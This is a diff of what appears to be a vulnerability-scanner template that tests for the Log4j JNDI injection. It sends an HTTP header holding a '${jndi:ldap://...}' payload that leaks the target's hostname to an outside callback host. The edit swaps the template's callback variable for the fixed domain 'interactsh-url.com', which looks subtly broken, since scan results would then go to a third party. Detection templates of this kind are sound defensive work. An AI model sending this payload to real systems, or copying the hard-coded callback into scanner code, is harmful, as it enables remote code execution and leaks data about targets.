@@ -28,7 +28,7 @@ http:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
-        X-Api-Version: ${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.xapiversion.{{interactsh-url}}}
+        X-Api-Version: ${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.xapiversion.interactsh-url.com}
 
     matchers-condition: and
     matchers:
